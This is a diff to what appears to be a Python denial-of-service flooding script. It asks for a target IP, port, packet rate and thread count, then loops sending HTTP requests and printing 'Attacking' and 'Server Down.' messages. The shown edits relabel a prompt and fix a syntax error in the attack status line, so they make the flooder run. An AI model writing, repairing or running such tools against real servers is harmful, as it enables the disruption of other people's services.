@@ -62,7 +62,7 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-ip = str(input("\033 [31m[+]\033[33m Target:\033[32m => \033[0m"))
+ip = str(input("\033 [31m[+]\033[33m Target IP:\033[32m => \033[0m"))
 port = int(input("\033[31m[+]\033[33m Port:\033[32m => \033[0m"))
 pack = int(input("\033[31m[+]\033[33m Packet/s:\033[32m => \033[0m"))
 thread = int(input("\033[31m[+]\033[33m Threads:\033[32m => \033[0m"))
@@ -86,7 +86,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent: {2}".format(str(ip),\033[34m int(port), xx))
+            print("\033[31m[+]\033[33m Attacking {0}:{1} |\033[32m Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
             print("\033[34m[+]\033[33m Server Down.")
